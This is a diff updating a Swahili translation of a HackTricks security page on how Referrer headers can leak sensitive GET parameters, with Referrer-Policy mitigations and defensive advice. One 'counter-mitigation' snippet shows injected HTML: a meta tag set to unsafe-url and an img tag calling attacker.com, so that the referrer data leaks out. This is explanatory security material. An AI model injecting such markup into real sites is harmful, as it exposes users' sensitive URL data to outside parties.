@@ -1,16 +1,18 @@
+# Interesting HTTP
+
 {{#include ../banners/hacktricks-training.md}}
 
-# Referrer headers and policy
+## Referrer headers and policy
 
-Referrer ni kichwa kinachotumiwa na vivinjari kuonyesha ni ukurasa gani wa awali ulitembelewa.
+Referrer ni header inayotumiwa na browsers kuonyesha ni ukurasa gani uliotembelewa awali.
 
-## Taarifa nyeti zilizovuja
+### Taarifa nyeti leaked
 
-Ikiwa katika wakati fulani ndani ya ukurasa wa wavuti taarifa nyeti ziko kwenye vigezo vya ombi la GET, ikiwa ukurasa una viungo vya vyanzo vya nje au mshambuliaji anaweza kufanya/kupendekeza (social engineering) mtumiaji kutembelea URL inayodhibitiwa na mshambuliaji. Inaweza kuwa na uwezo wa kutoa taarifa nyeti ndani ya ombi la hivi karibuni la GET.
+Ikiwa wakati fulani ndani ya ukurasa wa wavuti kuna taarifa nyeti kwenye parameters za GET request, ikiwa ukurasa una links zinazoelekeza kwenye vyanzo vya nje au attacker anaweza kumfanya/kumshauri (social engineering) mtumiaji kutembelea URL inayodhibitiwa na attacker. Anaweza ku-exfiltrate taarifa nyeti zilizo ndani ya GET request ya mwisho.
 
-## Mitigation
+### Mitigation
 
-Unaweza kufanya kivinjari kufuata **Referrer-policy** ambayo inaweza **kuepusha** taarifa nyeti kutumwa kwa programu nyingine za wavuti:
+Unaweza kuifanya browser ifuate **Referrer-policy** ambayo inaweza **kuzuia** taarifa nyeti kutumwa kwenye web applications nyingine:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -21,15 +23,15 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-## Counter-Mitigation
+### Kupinga Mitigation
 
-Unaweza kubadilisha sheria hii kwa kutumia tag ya meta ya HTML (mshambuliaji anahitaji kutumia na kuingiza HTML):
+Unaweza kubatilisha sheria hii kwa kutumia HTML meta tag (mshambuliaji anahitaji kutumia HTML injection):
 ```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
 ## Ulinzi
 
-Kamwe usiweke data nyeti ndani ya vigezo vya GET au njia katika URL.
+Usiweke kamwe data yoyote nyeti ndani ya GET parameters au paths katika URL.
 
 {{#include ../banners/hacktricks-training.md}}
